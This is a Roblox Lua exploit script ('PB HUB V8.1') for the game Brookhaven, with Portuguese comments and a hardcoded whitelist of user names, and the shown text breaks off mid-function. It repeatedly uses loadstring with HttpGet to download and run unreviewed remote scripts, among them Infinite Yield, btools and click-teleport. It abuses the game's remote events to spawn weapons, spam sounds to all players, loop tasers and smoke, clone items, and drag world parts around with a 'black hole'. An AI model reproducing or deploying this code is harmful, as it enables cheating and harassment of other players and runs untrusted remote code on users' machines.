local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Lista de usuários autorizados
local authorizedUsers = {
    ["AdmBrookhaven4"] = true,
    ["sr_greg81"] = true,
    ["TwT_perdiminhaconta"] = true,
    ["scarys_cary66666"] = true,
    ["AdmBrookhaven5"] = true,
    ["kdjdhwie12"] = true,
    ["admbughaven4"] = true,
    ["Pguel_01"] = true,
    ["fazolpguel2"] = true,
    ["kdjdhwie14"] = true,
    ["kdjdhwie13"] = true,
    ["TemplariosHub"] = true,
    ["j3ffwoods"] = true,
    ["Ink_sannes13"] = true,
    ["juninho126501"] = true,
    ["baconbadass6"] = true,
    ["Johnatan_FF95"] = true,
    ["Nego_Doce144"] = true,
    ["joaoantonio1997"] = true,
    ["contadefarme12"] = true,
    ["sr_greg26"] = true,
    ["sirtjfoxy123"] = true,
    ["samuel123456game1"] = true,
    ["thekjahwn"] = true,
    ["bypassadonis"] = true,
    ["PerfFectBx4483"] = true,
    ["breno628e5"] = true,
    ["kdjdhwie"] = true,
    ["SCARYS_CARY66666"] = true,
    ["davigemes300617"] = true,
    ["ERROR887282"] = true,
    ["Meliodas1234328"] = true,
    ["ajudante_Claudio"] = true,
    ["hdqnwsn"] = true,
    ["thek01890"] = true,
    ["mano_shark6"] = true,
    ["volvinhr"] = true,
    ["KAIO_XTY"] = true,
    ["djekejsn"] = true,
    ["D99SHOP"] = true,
    ["cotryball8"] = true,
    ["Lusquinha_067"] = true,
    ["ADMBROOKHAVEN6676"] = true,
    ["cuidado_025"] = true,
    ["PerfFectBx4483"] = true,
    ["Mateuszinban"] = true,
    ["nolyhaha"] = true,
    ["mTADORDEWEB666"] = true,
    ["contasecundariamrred"] = true,
    ["novacontapolicebrook"] = true,
    ["Nego_doce144"] = true,
    ["amandabrfofinhagam2"] = true,
}

-- Caso o jogador não seja autorizado, ele será kickado
if not authorizedUsers[LocalPlayer.Name] then
    LocalPlayer:Kick("❌️ Você não tem Permissão para Executar esse Script, fale com o criador dele para que ele libere seu acesso.")
    return
end


local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/kiwi541/Pblibray/refs/heads/main/README.md')))()


local Window = OrionLib:MakeWindow({
    Name = "PB HUB V8.1",
    HidePremium = false,
    SaveConfig = true,
    ConfigFolder = "Pb",
    IntroText = "Team Police Brookhaven"
})


local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "ScreenGui"
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

local Toggle = Instance.new("ImageButton")
Toggle.Name = "Toggle"
Toggle.Parent = ScreenGui
Toggle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Toggle.BackgroundTransparency = 0.5
Toggle.Position = UDim2.new(0, 0, 0.454706937, 0)
Toggle.Size = UDim2.new(0, 50, 0, 50)
Toggle.Image = "rbxassetid://86898373680592"
Toggle.Draggable = true

local Corner = Instance.new("UICorner")
Corner.CornerRadius = UDim.new(0.1, 0)
Corner.Parent = Toggle

local isOn = false
local selectedPlayerName = nil

local function onButtonClicked()
    if gethui():FindFirstChild("Orion") then
        gethui().Orion.Enabled = not gethui().Orion.Enabled
    end
end

local function offButtonClicked()
    if gethui():FindFirstChild("Orion") then
        gethui().Orion.Enabled = not gethui().Orion.Enabled
    end
end

Toggle.MouseButton1Click:Connect(function()
    isOn = not isOn
    if isOn then
        Toggle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        onButtonClicked()
    else
        Toggle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        offButtonClicked()
    end
end)


local Tab = Window:MakeTab({
	Name = "Bem vindo",
	Icon = "rbxassetid://10734898355",
	PremiumOnly = false
})


Tab:AddParagraph("Olá Soldados","")


Tab:AddButton({
	Name = "Infinity Yield(Obrigatório)",
	Callback = function()
      	loadstring(game:HttpGet("https://rawscripts.net/raw/Infinite-Yield_500"))()
	print("button pressed")
  	end    
})


local Tab = Window:MakeTab({
	Name = "Items",
	Icon = "rbxassetid://10734898355",
	PremiumOnly = false
})


Tab:AddButton({
	Name = "Bombox Fe Tool",
	Callback = function()
      		local player = game.Players.LocalPlayer
local backpack = player:WaitForChild("Backpack")
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

-- Criar o item Boombox e adicioná-lo diretamente na Backpack
local i = Instance.new("Tool")
i.Name = "Boombox"
i.Parent = backpack  -- Agora é adicionado diretamente na Backpack
i.Grip = CFrame.new(0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0)
i.GripForward = Vector3.new(0, -1, 0)
i.GripRight = Vector3.new(0, 0, 1)
i.GripUp = Vector3.new(1, 0, 0)

local j = Instance.new("Part")
j.Name = "Handle"
j.Parent = i
j.Size = Vector3.new(1, 1.2, 1)
j.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
j.Transparency = 1
j.Anchored = false
j.CanCollide = false

local screenGui

local function createGui()
    screenGui = Instance.new("ScreenGui")
    screenGui.Name = "BoomboxGui"
    screenGui.Parent = game.Players.LocalPlayer.PlayerGui

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 350, 0, 150)
    frame.Position = UDim2.new(0.5, -175, 0.5, -75)
    frame.BackgroundColor3 = Color3.fromRGB(0, 100, 255) -- Azul
    frame.BackgroundTransparency = 0.3 -- Transparente
    frame.BorderSizePixel = 0
    frame.Parent = screenGui

    local uiCorner = Instance.new("UICorner")
    uiCorner.CornerRadius = UDim.new(0, 15)
    uiCorner.Parent = frame

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0.4, 0)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.Text = "Coloque um ID de áudio e aperte Play Boombox By:Noly Fragiota"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.TextWrapped = true
    title.TextScaled = true
    title.Parent = frame

    local input = Instance.new("TextBox")
    input.Size = UDim2.new(0.9, 0, 0.18, 0)
    input.Position = UDim2.new(0.05, 0, 0.5, 0)
    input.Text = "1780625909"
    input.TextColor3 = Color3.fromRGB(255, 255, 255)
    input.BackgroundColor3 = Color3.fromRGB(0, 50, 150) -- Azul escuro
    input.BackgroundTransparency = 0.3
    input.Font = Enum.Font.SourceSans
    input.TextScaled = true
    input.BorderSizePixel = 0
    input.Parent = frame

    local inputCorner = Instance.new("UICorner")
    inputCorner.CornerRadius = UDim.new(0, 10)
    inputCorner.Parent = input

    -- Função para criar os botões
    local function createButton(text, positionY, callback)
        local button = Instance.new("TextButton")
        button.Size = input.Size
        button.Position = UDim2.new(0.05, 0, positionY, 0)
        button.Text = text
        button.TextColor3 = Color3.fromRGB(255, 255, 255)
        button.BackgroundColor3 = Color3.fromRGB(0, 50, 150) -- Azul escuro
        button.Font = Enum.Font.GothamBold
        button.TextScaled = true
        button.BorderSizePixel = 1
        button.BorderColor3 = Color3.fromRGB(255, 255, 255)
        button.Parent = frame

        local buttonCorner = Instance.new("UICorner")
        buttonCorner.CornerRadius = UDim.new(0, 10)
        buttonCorner.Parent = button

        button.MouseButton1Click:Connect(callback)
    end

    -- Função do botão Play (toca o áudio)
    createButton("Play", 0.75, function()
        local audioId = tonumber(input.Text) or 7337298420
        local args = {
            [1] = "PickingTools",
            [2] = "Assault"
        }

        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))

        wait(0.1)

        local player = game.Players.LocalPlayer
        local backpack = player:WaitForChild("Backpack")

        local tool = backpack:WaitForChild("Assault", 10)

        if tool then
            tool.Parent = player.Character
        end

        wait(0.1)

        local args = {
            [1] = workspace.Model.Street.Street,
            [2] = game:GetService("Players").LocalPlayer.Character.Assault.Handle,
            [3] = Vector3.new(0.2, 0.3, -2.5),
            [4] = Vector3.new(115.74, 0.025, -36.11),
            [5] = game:GetService("Players").LocalPlayer.Character.Assault.GunScript_Local.MuzzleEffect,
            [6] = game:GetService("Players").LocalPlayer.Character.Assault.GunScript_Local.HitEffect,
            [7] = audioId,
            [8] = audioId,
            [9] = { [1] = false },
            [10] = {
                [1] = 25,
                [2] = Vector3.new(0.25, 0.25, 100),
                [3] = BrickColor.new(24),
                [4] = 0.25,
                [5] = Enum.Material.SmoothPlastic,
                [6] = 0.25
            },
            [11] = true,
            [12] = false
        }

        local muzzleEffect = game:GetService("Players").LocalPlayer.Character.Assault.GunScript_Local.MuzzleEffect
        local sound = muzzleEffect:FindFirstChildOfClass("Sound")

        if sound then
            sound.SoundId = "rbxassetid://" .. audioId
        end

        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1n"):FireServer(unpack(args))

        wait(1.4)

        game:GetService("ReplicatedStorage").RE["1Clea1rTool1s"]:FireServer("ClearAllTools")
    end)

    -- Função do botão Play All (toca para todos)
    createButton("Play All", 0.95, function()
        local audioId = tonumber(input.Text) or 7236490488
        local args = {workspace, audioId, 1}

        local soundID = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1nSound1s")

        if soundID then
            soundID:FireServer(unpack(args))
            wait(6)
            soundID:FireServer(workspace, 0, 0)
        end
    end)
end

-- Função de equipar o item
local function onEquipped()
    createGui()
    local args = { "wear", 18756289999 }
    local updateAvatarEvent = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r")
    if updateAvatarEvent then
        updateAvatarEvent:FireServer(unpack(args))
    end
end

-- Função de desequipar o item
local function onUnequipped()
    if screenGui then
        screenGui:Destroy()
        screenGui = nil
    end
    local args = { "remove", 18756289999 }
    local updateAvatarEvent = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r")
    if updateAvatarEvent then
        updateAvatarEvent:FireServer(unpack(args))
    end
end

-- Conectar eventos de Equipar e Desequipar
i.Equipped:Connect(onEquipped)
i.Unequipped:Connect(onUnequipped)

i.Parent = backpack -- Agora o Boombox será adicionado à Backpack do jogador

print("Tool 'Boombox'.")
print("button pressed")
  	end    
})


Tab:AddButton({
	Name = "Tool Black Role",
	Callback = function()
      		mouse = game.Players.LocalPlayer:GetMouse()
tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "Click Black Role"
tool.Activated:connect(function()
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")

local angle = 1
local radius = 10
local blackHoleActive = false

local function setupPlayer()
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

    local Folder = Instance.new("Folder", Workspace)
    local Part = Instance.new("Part", Folder)
    local Attachment1 = Instance.new("Attachment", Part)
    Part.Anchored = true
    Part.CanCollide = false
    Part.Transparency = 1

    return humanoidRootPart, Attachment1
end

local humanoidRootPart, Attachment1 = setupPlayer()

if not getgenv().Network then
    getgenv().Network = {
        BaseParts = {},
        Velocity = Vector3.new(14.46262424, 14.46262424, 14.46262424)
    }

    Network.RetainPart = function(part)
        if typeof(part) == "Instance" and part:IsA("BasePart") and part:IsDescendantOf(Workspace) then
            table.insert(Network.BaseParts, part)
            part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
            part.CanCollide = false
        end
    end

    local function EnablePartControl()
        LocalPlayer.ReplicationFocus = Workspace
        RunService.Heartbeat:Connect(function()
            sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)
            for _, part in pairs(Network.BaseParts) do
                if part:IsDescendantOf(Workspace) then
                    part.Velocity = Network.Velocity
                end
            end
        end)
    end

    EnablePartControl()
end

local function ForcePart(v)
    if v:IsA("Part") and not v.Anchored and not v.Parent:FindFirstChild("Humanoid") and not v.Parent:FindFirstChild("Head") and v.Name ~= "Handle" then
        for _, x in next, v:GetChildren() do
            if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
                x:Destroy()
            end
        end
        if v:FindFirstChild("Attachment") then
            v:FindFirstChild("Attachment"):Destroy()
        end
        if v:FindFirstChild("AlignPosition") then
            v:FindFirstChild("AlignPosition"):Destroy()
        end
        if v:FindFirstChild("Torque") then
            v:FindFirstChild("Torque"):Destroy()
        end
        v.CanCollide = false
        
        local Torque = Instance.new("Torque", v)
        Torque.Torque = Vector3.new(1000000, 1000000, 1000000)
        local AlignPosition = Instance.new("AlignPosition", v)
        local Attachment2 = Instance.new("Attachment", v)
        Torque.Attachment0 = Attachment2
        AlignPosition.MaxForce = math.huge
        AlignPosition.MaxVelocity = math.huge
        AlignPosition.Responsiveness = 500
        AlignPosition.Attachment0 = Attachment2
        AlignPosition.Attachment1 = Attachment1
    end
end

local function toggleBlackHole()
    blackHoleActive = not blackHoleActive
    if blackHoleActive then
        for _, v in next, Workspace:GetDescendants() do
            ForcePart(v)
        end

        Workspace.DescendantAdded:Connect(function(v)
            if blackHoleActive then
                ForcePart(v)
            end
        end)

        spawn(function()
            while blackHoleActive and RunService.RenderStepped:Wait() do
                angle = angle + math.rad(2)

                local offsetX = math.cos(angle) * radius
                local offsetZ = math.sin(angle) * radius

                Attachment1.WorldCFrame = humanoidRootPart.CFrame * CFrame.new(offsetX, 0, offsetZ)
            end
        end)
    else
        Attachment1.WorldCFrame = CFrame.new(0, -1000, 0)
    end
end

LocalPlayer.CharacterAdded:Connect(function()
    humanoidRootPart, Attachment1 = setupPlayer()
    if blackHoleActive then
        toggleBlackHole()
    end
end)

spawn(function()
    while true do
        RunService.RenderStepped:Wait()
        if blackHoleActive then
            angle = angle + math.rad(angleSpeed)
        end
    end
end)

toggleBlackHole()


end)
tool.Parent = game.Players.LocalPlayer.Backpack
print("button pressed")
  	end    
})


Tab:AddButton({
	Name = "tool Speed",
	Callback = function()
      		local player = game.Players.LocalPlayer
        local backpack = player:WaitForChild("Backpack")
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoid = character:WaitForChild("Humanoid")
        local originalWalkSpeed = humanoid.WalkSpeed

        local h = Instance.new("Model", game:GetService("Lighting"))

        local i = Instance.new("Tool")
        i.Name = "SPEEDTOOL"
        i.Parent = h
        i.Grip = CFrame.new(0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0)
        i.GripForward = Vector3.new(0, -1, 0)
        i.GripRight = Vector3.new(0, 0, 1)
        i.GripUp = Vector3.new(1, 0, 0)
        i.TextureId = "rbxassetid://106331933297015"

        local j = Instance.new("Part")
        j.Name = "Handle"
        j.Parent = i
        j.Size = Vector3.new(1, 1.2, 1)
        j.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        j.Transparency = 1
        j.Anchored = false
        j.CanCollide = false

        local function onEquipped()
            humanoid.WalkSpeed = 100

            local args = {
                [1] = "wear",
                [2] = 18385684081
            }
            local updateAvatarEvent = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r")
            if updateAvatarEvent then
                updateAvatarEvent:FireServer(unpack(args))
            end
        end

        local function onUnequipped()
            humanoid.WalkSpeed = originalWalkSpeed

            local args = {
                [1] = "remove",
                [2] = 18385684081
            }
            local updateAvatarEvent = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r")
            if updateAvatarEvent then
                updateAvatarEvent:FireServer(unpack(args))
            end
        end

        i.Equipped:Connect(onEquipped)
        i.Unequipped:Connect(onUnequipped)

        i.Parent = backpack

        print("Tool speed add")
print("button pressed")
  	end    
})


Tab:AddButton({
	Name = "Couch",
	Callback = function()
      	local args = {
                [1] = "PickingTools",
                [2] = "Couch"
            }
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
	print("button pressed")
  	end    
})


Tab:AddButton({
	Name = "Pegar Cartão Da Agência",
	Callback = function()
      		local args = {
            [1] = "PickingTools",
            [2] = "KeyCardDarkGreen"
        }
        local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
        if remoteFunction then
            remoteFunction:InvokeServer(unpack(args))
        else
            warn("Função remota '1Too1l' não encontrada em ReplicatedStorage.RE")
        end
print("button pressed")
  	end    
})


Tab:AddButton({
	Name = "Pegar Cartão da elétrica",
	Callback = function()
      	local args = {
            [1] = "PickingTools",
            [2] = "PowerKeyCard"
        }
        local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
        if remoteFunction then
            remoteFunction:InvokeServer(unpack(args))
        else
            warn("Função remota '1Too1l' não encontrada em ReplicatedStorage.RE")
        end
	print("button pressed")
  	end    
})


Tab:AddButton({
	Name = "Pegar Arco",
	Callback = function()
      		        local args = {
            [1] = "PickingTools",
            [2] = "Arch"
        }
        local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
        if remoteFunction then
            remoteFunction:InvokeServer(unpack(args))
        else
            warn("Função remota '1Too1l' não encontrada em ReplicatedStorage.RE")
        end
print("button pressed")
  	end    
})


Tab:AddButton({
	Name = "Pegar Crystal 1",
	Callback = function()
      		local args = {
            [1] = "PickingTools",
            [2] = "Crystals"
        }
        local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
        if remoteFunction then
            remoteFunction:InvokeServer(unpack(args))
        else
            warn("Função remota '1Too1l' não encontrada em ReplicatedStorage.RE")
        end
print("button pressed")
  	end    
})


Tab:AddButton({
	Name = "Crystal 2",
	Callback = function()
      	local args = {
            [1] = "PickingTools",
            [2] = "Crystal"
        }
        local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
        if remoteFunction then
            remoteFunction:InvokeServer(unpack(args))
        else
            warn("Função remota '1Too1l' não encontrada em ReplicatedStorage.RE")
        end
	print("button pressed")
  	end    
})


Tab:AddButton({
	Name = "Agência Book",
	Callback = function()
      	local args = {
            [1] = "PickingTools",
            [2] = "AgencyBook"
        }
        local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
        if remoteFunction then
            remoteFunction:InvokeServer(unpack(args))
        else
            warn("Função remota '1Too1l' não encontrada em ReplicatedStorage.RE")
        end
	print("button pressed")
  	end    
})


Tab:AddButton({
	Name = "OldKey",
	Callback = function()
      		local args = {
            [1] = "PickingTools",
            [2] = "OldKey"
        }
        local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
        if remoteFunction then
            remoteFunction:InvokeServer(unpack(args))
        else
            warn("Função remota '1Too1l' não encontrada em ReplicatedStorage.RE")
        end
print("button pressed")
  	end    
})


Tab:AddButton({
	Name = "Arma De Assalto",
	Callback = function()
      		local args = {
            [1] = "PickingTools",
            [2] = "Assault"
        }
        local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
        if remoteFunction then
            remoteFunction:InvokeServer(unpack(args))
        else
            warn("Função remota '1Too1l' não encontrada em ReplicatedStorage.RE")
        end
print("button pressed")
  	end    
})


Tab:AddButton({
	Name = "Shotgun",
	Callback = function()
      	local args = {
            [1] = "PickingTools",
            [2] = "Shotgun"
        }
        local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
        if remoteFunction then
            remoteFunction:InvokeServer(unpack(args))
        else
            warn("Função remota '1Too1l' não encontrada em ReplicatedStorage.RE")
        end
	print("button pressed")
  	end    
})


local Section = Tab:AddSection({
    Name = "Config tool"
})

local args = {
    [1] = "PickingTools",
    [2] = ""
}

local function pegarItem(itemName)
    args[2] = itemName
    game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Too1l"):InvokeServer(unpack(args))
end

Tab:AddTextbox({
    Name = "Item Name",
    Default = "",
    TextDisappear = true,
    Callback = function(value)
        pegarItem(value)
    end
})

Tab:AddButton({
    Name = "Pegar Item",
    Callback = function()
        local itemName = ItemPickerTab:GetTextbox("Item Name").Value
        pegarItem(itemName)
    end
})
local Section = Tab:AddSection({
    Name = "Bomb"
})
Tab:AddButton({
Name = "FireX",
Callback = function()
local args = {
    [1] = "Bomb1NCD3NT"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Blo1wBomb1sServe1r"):FireServer(unpack(args))
wait(1)
local args = {
    [1] = "Bomb1NCD3NT"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Blo1wBomb1sServe1r"):FireServer(unpack(args))
wait(1)
local args = {
    [1] = "Bomb1NCD3NT"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Blo1wBomb1sServe1r"):FireServer(unpack(args))
wait(1)
end
})
Tab:AddButton({
Name = "Bomb",
Callback = function()
local player = game.Players.LocalPlayer
local backpack = player:WaitForChild("Backpack")

local itemToDuplicate = backpack:FindFirstChild("Bomb") -- Nome do item

if itemToDuplicate then
    local clonedItem = itemToDuplicate:Clone() -- Clonar o item
    clonedItem.Parent = backpack -- Colocar o clone no inventário
    print("Item duplicado!")
else
    print("Item não encontrado no inventário.")
end
wait(0.1)
-- Função para verificar e equipar itens
local function equiparItem(itemName)
    local player = game.Players.LocalPlayer
    local backpack = player:FindFirstChild("Backpack")
    
    if backpack then
        -- Verifica se o item já está no inventário
        local item = backpack:FindFirstChild(itemName)
        if item then
            -- Move o item para a mão do jogador, caso não esteja equipado
            local character = player.Character
            if character and not character:FindFirstChild(itemName) then
                item.Parent = character
                print(itemName .. " equipado!")
            else
                print(itemName .. " já está equipado.")
            end
        else
            print(itemName .. " não está no inventário.")
        end
    else
        print("Backpack não encontrado.")
    end
end

-- Checar e equipar Sniper e FireX
equiparItem("Bomb")
end
})


local Section = Tab:AddSection({
    Name = "Tools Fake/Visual"
})
Tab:AddButton({
Name = "FE PUNCH",
Callback = function()
 loadstring(game:HttpGet(('http://pastefy.app/GvnHVjT5/raw'),true))()
end
})
Tab:AddButton({
Name = "Telekiness [FE]",
Callback = function()
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/SAZXHUB/Control-update/main/README.md'),true))()
end
})
Tab:AddButton({
Name = "f3x",
Callback = function()
 loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()
end
})
Tab:AddButton({
Name = "Btools",
Callback = function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/err0r129/PqpHadesBlair/main/Bao.lua"))()
end
})
Tab:AddButton({
Name = "Click TP",
Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/err0r129/KptHadesBlair/main/Bao.lua"))()
end
})
local Section = Tab:AddSection({
    Name = "Taser"
})
Tab:AddButton({
	Name = "Give Taser",
	Callback = function()
      	local args = {
    [1] = "PickingTools",
    [2] = "Taser"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
  	end    
})

local toggleActive = false
local function loopTaser()
while toggleActive do
local args = {
    [1] = "Taser",
    [2] = "On"
}

game:GetService("Players").LocalPlayer.Character.Taser.ToolSound:FireServer(unpack(args))
wait(0.111111) -- intervalo de 1 segundo entre cada repetição
end
end

Tab:AddToggle({
Name = "loop Taser",
Default = false,
Callback = function(value)
toggleActive = value
if toggleActive then
loopTaser()
end
end
})
local Section = Tab:AddSection({
    Name = "FireX"
})
Tab:AddButton({
	Name = "Give FireX",
	Callback = function()
      	local args = {
    [1] = "PickingTools",
    [2] = "FireX"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
  	end    
})

local toggleActive = false
local function loopFireX()
while toggleActive do
local args = {
    [1] = "FireX",
    [2] = "On"
}

game:GetService("Players").LocalPlayer.Character.FireX.ToolSound:FireServer(unpack(args))
wait(0.111111111111111111111111) -- intervalo de 1 segundo entre cada repetição
end
end

Tab:AddToggle({
Name = "loop FireX",
Default = false,
Callback = function(value)
toggleActive = value
if toggleActive then
loopFireX()
end
end
})
local Section = Tab:AddSection({
    Name = "Basketball"
})
Tab:AddButton({
	Name = "Give Basketball",
	Callback = function()
      	local args = {
    [1] = "PickingTools",
    [2] = "Basketball"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))

--Ball

local player = game.Players.LocalPlayer
local backpack = player:WaitForChild("Backpack")

local itemToDuplicate = backpack:FindFirstChild("Basketball") -- Nome do item

if itemToDuplicate then
    local clonedItem = itemToDuplicate:Clone() -- Clonar o item
    clonedItem.Parent = backpack -- Colocar o clone no inventário
    print("Item duplicado!")
else
    print("Item não encontrado no inventário.")
end
  	end    
})

local toggleActive = false
local function loopBall()
while toggleActive do
local args = {
    [1] = Vector3.new(-30.919673919677734, 0.02500009536743164, 190.3595733642578)
}

game:GetService("Players").LocalPlayer.Character.Basketball.ClickEvent:FireServer(unpack(args))
wait(1) -- intervalo de 1 segundo entre cada repetição
end
end

Tab:AddToggle({
Name = "loop Ball",
Default = false,
Callback = function(value)
toggleActive = value
if toggleActive then
loopBall()
end
end
})
local Section = Tab:AddSection({
    Name = "Gun mod"
})
Tab:AddButton({
Name = "Give Sniper Fire",
Callback = function()
 local args = {
    [1] = "PickingTools",
    [2] = "Sniper"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
wait(0.1)
 local args = {
    [1] = "PickingTools",
    [2] = "PaperbagFire"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
wait(0.1)
-- Função para verificar e equipar itens
local function equiparItem(itemName)
    local player = game.Players.LocalPlayer
    local backpack = player:FindFirstChild("Backpack")
    
    if backpack then
        -- Verifica se o item já está no inventário
        local item = backpack:FindFirstChild(itemName)
        if item then
            -- Move o item para a mão do jogador, caso não esteja equipado
            local character = player.Character
            if character and not character:FindFirstChild(itemName) then
                item.Parent = character
                print(itemName .. " equipado!")
            else
                print(itemName .. " já está equipado.")
            end
        else
            print(itemName .. " não está no inventário.")
        end
    else
        print("Backpack não encontrado.")
    end
end

-- Checar e equipar Sniper e FireX
equiparItem("Sniper")
equiparItem("PaperbagFire")
    end
})
Tab:AddButton({
Name = "Equip all guns",
Callback = function()
local args = {
    [1] = "PickingTools",
    [2] = "Assault"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
wait(0.1)
local args = {
    [1] = "PickingTools",
    [2] = "Shotgun"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
wait(0.1)
local args = {
    [1] = "PickingTools",
    [2] = "GlockBrown"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
wait(0.1)
local args = {
    [1] = "PickingTools",
    [2] = "Sniper"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
wait(0.1)
-- Função para verificar e equipar itens
local function equiparItem(itemName)
    local player = game.Players.LocalPlayer
    local backpack = player:FindFirstChild("Backpack")
    
    if backpack then
        -- Verifica se o item já está no inventário
        local item = backpack:FindFirstChild(itemName)
        if item then
            -- Move o item para a mão do jogador, caso não esteja equipado
            local character = player.Character
            if character and not character:FindFirstChild(itemName) then
                item.Parent = character
                print(itemName .. " equipado!")
            else
                print(itemName .. " já está equipado.")
            end
        else
            print(itemName .. " não está no inventário.")
        end
    else
        print("Backpack não encontrado.")
    end
end

-- Checar e equipar Sniper e FireX
equiparItem("Sniper")
equiparItem("Shotgun")
equiparItem("Assault")
equiparItem("GlockBrown")
end
})
Tab:AddButton({
Name = "Give Gun Smoke",
Callback = function()
 local args = {
    [1] = "PickingTools",
    [2] = "Sniper"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
wait(0.1)
 local args = {
    [1] = "PickingTools",
    [2] = "FireX"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
wait(0.1)
-- Função para verificar e equipar itens
local function equiparItem(itemName)
    local player = game.Players.LocalPlayer
    local backpack = player:FindFirstChild("Backpack")
    
    if backpack then
        -- Verifica se o item já está no inventário
        local item = backpack:FindFirstChild(itemName)
        if item then
            -- Move o item para a mão do jogador, caso não esteja equipado
            local character = player.Character
            if character and not character:FindFirstChild(itemName) then
                item.Parent = character
                print(itemName .. " equipado!")
            else
                print(itemName .. " já está equipado.")
            end
        else
            print(itemName .. " não está no inventário.")
        end
    else
        print("Backpack não encontrado.")
    end
end

-- Checar e equipar Sniper e FireX
equiparItem("Sniper")
equiparItem("FireX")
    end
})

local toggleActive = false
local function loopSmoke()
while toggleActive do
local args = {
    [1] = "FireX",
    [2] = "On"
}

game:GetService("Players").LocalPlayer.Character.FireX.ToolSound:FireServer(unpack(args))
wait(0.111111111111111111111111) -- intervalo de 1 segundo entre cada repetição
end
end

Tab:AddToggle({
Name = "loop Smoke",
Default = false,
Callback = function(value)
toggleActive = value
if toggleActive then
loopSmoke()
end
end
})

Tab:AddButton({
Name = "Give Gun Taser",
Callback = function()
 local args = {
    [1] = "PickingTools",
    [2] = "Sniper"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
wait(0.1)
 local args = {
    [1] = "PickingTools",
    [2] = "Taser"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
wait(0.1)
-- Função para verificar e equipar itens
local function equiparItem(itemName)
    local player = game.Players.LocalPlayer
    local backpack = player:FindFirstChild("Backpack")
    
    if backpack then
        -- Verifica se o item já está no inventário
        local item = backpack:FindFirstChild(itemName)
        if item then
            -- Move o item para a mão do jogador, caso não esteja equipado
            local character = player.Character
            if character and not character:FindFirstChild(itemName) then
                item.Parent = character
                print(itemName .. " equipado!")
            else
                print(itemName .. " já está equipado.")
            end
        else
            print(itemName .. " não está no inventário.")
        end
    else
